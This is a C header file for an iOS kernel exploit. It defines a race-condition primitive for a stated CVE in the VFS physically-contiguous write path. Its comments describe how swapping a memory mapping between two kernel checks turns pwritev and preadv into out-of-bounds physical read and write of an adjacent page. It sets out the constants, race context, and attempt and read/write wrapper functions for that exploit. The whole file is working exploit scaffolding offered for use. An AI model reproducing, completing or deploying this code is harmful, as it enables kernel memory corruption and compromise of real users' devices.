// ds_race.h — CVE-2025-43520 VFS physically-contiguous race primitive
//
// bug: cluster_io_type() checks UPL_PHYS_CONTIG once, then cluster_write_contig()
// calls vm_map_get_upl() again and trusts the first answer. swap the mapping in
// between and the kernel drives phys I/O off a stale contiguous assumption.
// every page after the first UPL page is addressed as paddr0 + n*0x4000, so the
// tail of a 0x1000-long iov lands one physical page past our own page0.
//
// primitives (note the naming is from the fd's point of view, not ours):
//   pwritev()  memory -> file   == physical READ  of the adjacent page
//   preadv()   file   -> memory == physical WRITE of the adjacent page
#ifndef DS_RACE_H
#define DS_RACE_H

#include <mach/mach.h>
#include <stdint.h>
#include <stddef.h>
#include <pthread.h>

#define DS_VM_PAGE        0x4000ULL   // arm64 iOS vm page size
#define DS_DEV_BLOCK      0x1000ULL   // mnt_devblocksize, verified via DKIOCGETPHYSICALBLOCKSIZE
#define DS_IOV_OFFSET     0x3f00ULL   // DS_VM_PAGE - (DS_DEV_BLOCK - 0x100)
#define DS_IOV_TOTAL      0x1000ULL   // head 0x100 + tail 0xf00
#define DS_HEAD_LEN       0x0100ULL   // lands inside our own page0, harmless
#define DS_TAIL_LEN       0x0f00ULL   // lands in the adjacent physical page

#define DS_RACE_REGION    (2 * DS_VM_PAGE)   // racing mapping: page0 ours, page1 the assumption

typedef struct {
    int               fd_read;        // preadv source  (write primitive)
    int               fd_write;       // pwritev target (read primitive)
    mach_vm_address_t region;         // fixed VA the race swaps under
    mach_vm_address_t contig_src;     // stable IOSurface-backed copy we remap from
    uint64_t          marker;         // tag written into page0 for identity checks
    volatile int      remap_active;   // remap thread gate
    volatile int      stop;
    pthread_t         remap_thread;
    uint64_t          attempts;
    uint64_t          contig_hits;    // errno == EINVAL after the loop => contig path taken
} ds_race_ctx;

// contiguous_mapping reports whether contig_src came back as a real PurpleGfxMem
// surface. if 0, the race can never select the contig path and every attempt is
// wasted — callers should bail instead of burning battery.
int  ds_race_init(ds_race_ctx *c);
int  ds_race_start(ds_race_ctx *c);
void ds_race_stop(ds_race_ctx *c);
int  ds_race_contiguous(ds_race_ctx *c);

// one attempt. dir 0 = read adjacent phys page into out, 1 = write payload out.
// returns 1 when the contig code path was entered (errno == EINVAL), 0 otherwise.
// out must hold DS_IOV_TOTAL bytes.
int  ds_race_attempt(ds_race_ctx *c, int dir, void *out, uint64_t *attempts_out);

// convenience wrappers that keep hammering until contig_hits advances or the
// budget runs out. both return the number of contig hits achieved.
uint64_t ds_oob_read(ds_race_ctx *c, void *out, uint64_t budget);
uint64_t ds_oob_write(ds_race_ctx *c, const void *in, uint64_t budget);

#endif
